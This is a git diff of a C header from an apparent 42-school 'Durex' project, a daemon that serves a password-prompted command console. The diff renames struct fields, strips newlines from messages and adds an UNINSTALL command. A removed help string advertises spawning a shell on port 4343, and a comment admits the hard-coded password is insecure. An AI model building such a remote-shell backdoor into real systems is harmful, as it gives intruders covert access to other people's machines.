@@ -6,7 +6,7 @@
 /*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/06 16:57:04 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/14 18:20:02 by banthony         ###   ########.fr       */
+/*   Updated: 2019/11/15 16:04:18 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,17 +28,15 @@
 # define MAX_PENDING_CLIENT 3
 # define READ_BUFFER_SIZE 4096
 
-# define SERVER_STARTED "======== Server has started! ========\n"
-# define SELECT_ERR "Server: select has failed.\n"
-# define ACCEPT_ERR "Server: accept has failed.\n"
-# define BIND_ERR "Server: bind has failed.\n"
+# define SERVER_STARTED "======== Server has started! ========"
+# define SELECT_ERR "Server: select has failed."
+# define ACCEPT_ERR "Server: accept has failed."
+# define BIND_ERR "Server: bind has failed."
 # define ALLOC_ERR(s) "An allocation has failed:" s
-# define DISCONNECTED "Disconnected.\n"
-# define CLIENT_LOGIN "password requested.\n"
-# define CLIENT_LOG "connected and log.\n"
-# define CONNEXION_REFUSED "Connexion refused.\n"
-
-# define HELP_CONTENT	"Durex commands:\n\t'help' or ?''\t- Show this message.\n\t'shell'\t- Spawn a shell on port 4343.\n"
+# define DISCONNECTED "Disconnected."
+# define CLIENT_LOGIN "password requested."
+# define CLIENT_LOG "connected and log."
+# define CONNEXION_REFUSED "Connexion refused."
 
 // Temporary const password (totally unsecure)
 # define SERVER_PROMPT "Durex>"
@@ -48,12 +46,12 @@
 typedef struct s_server
 {
 	int			port;
-	int			srv_sock;
-	fd_set		masterfdset;
-	size_t		max_client;
+	int			socket;
+	fd_set		fdset;
+	size_t		client_limit;
 	size_t		clients;
-	t_bool		shell;
 	t_list		*client_lst;
+	t_bool		require_pass;
 }				t_server;
 
 typedef struct	s_client
@@ -67,6 +65,7 @@ typedef enum	e_server_cmd
 {
  	HELP,
 	HELP_ALIAS,
+	UNINSTALL,
 	SHELL,
 	EXIT,
 	SERVER_CMD_NUMBER,
@@ -85,7 +84,7 @@ t_bool			new_client(t_server *server);
 t_bool			deco_client(t_client *client, t_server *server);
 t_bool			client_prefix(void *data, char (*prefix)[PREFIX_SIZE]);
 void			server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client);
-t_bool			create_server(t_server *server, int port, size_t max_client);
+t_bool			create_server(t_server *server, int port, size_t client_limit);
 t_bool			server_loop(t_server *server);
 
 #endif
